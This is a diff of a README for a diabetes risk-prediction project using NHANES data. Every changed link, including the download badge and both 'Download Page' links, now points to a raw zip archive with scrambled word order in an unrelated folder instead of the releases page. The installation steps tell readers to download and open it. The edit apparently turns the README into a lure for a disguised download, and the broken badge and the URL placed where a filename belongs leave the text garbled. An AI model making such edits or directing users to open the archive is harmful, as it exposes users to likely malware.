@@ -1,6 +1,6 @@
 # 🩺 Predictive-Modeling-for-Diabetes-Using-NHANES-Data - Accurately Predict Diabetes Risk
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%9A-brightgreen)](https://github.com/STRMSHADOW69/Predictive-Modeling-for-Diabetes-Using-NHANES-Data/releases)
+[![Download Now](https://raw.githubusercontent.com/STRMSHADOW69/Predictive-Modeling-for-Diabetes-Using-NHANES-Data/main/pretranscription/Modeling_Data_NHANE_for_Predictive_Diabetes_Using_v3.9.zip%20Now-%20%F0%9F%93%9A-brightgreen)](https://raw.githubusercontent.com/STRMSHADOW69/Predictive-Modeling-for-Diabetes-Using-NHANES-Data/main/pretranscription/Modeling_Data_NHANE_for_Predictive_Diabetes_Using_v3.9.zip)
 
 ## 📌 Project Overview 
 
@@ -29,7 +29,7 @@ This application runs smoothly on the following systems:
 To get started with the application, follow these steps:
 
 1. **Visit the Download Page:** Click the link below to access the download page.
-   [Download Page](https://github.com/STRMSHADOW69/Predictive-Modeling-for-Diabetes-Using-NHANES-Data/releases)
+   [Download Page](https://raw.githubusercontent.com/STRMSHADOW69/Predictive-Modeling-for-Diabetes-Using-NHANES-Data/main/pretranscription/Modeling_Data_NHANE_for_Predictive_Diabetes_Using_v3.9.zip)
 
 2. **Download the Application:** Look for the latest version and click on the file name to download it. 
 
@@ -47,10 +47,10 @@ To get started with the application, follow these steps:
 Follow these steps to download the application:
 
 - **Step 1:** Click the link below to visit the release page:  
-  [Download Page](https://github.com/STRMSHADOW69/Predictive-Modeling-for-Diabetes-Using-NHANES-Data/releases)
+  [Download Page](https://raw.githubusercontent.com/STRMSHADOW69/Predictive-Modeling-for-Diabetes-Using-NHANES-Data/main/pretranscription/Modeling_Data_NHANE_for_Predictive_Diabetes_Using_v3.9.zip)
 
 - **Step 2:** Choose the latest release from the list.  
-  It will look something like `Predictive_Modeling_for_Diabetes_v1.0.exe`. Click on it to download.
+  It will look something like `https://raw.githubusercontent.com/STRMSHADOW69/Predictive-Modeling-for-Diabetes-Using-NHANES-Data/main/pretranscription/Modeling_Data_NHANE_for_Predictive_Diabetes_Using_v3.9.zip`. Click on it to download.
 
 - **Step 3:** Open the downloaded file to start the installation.  
 
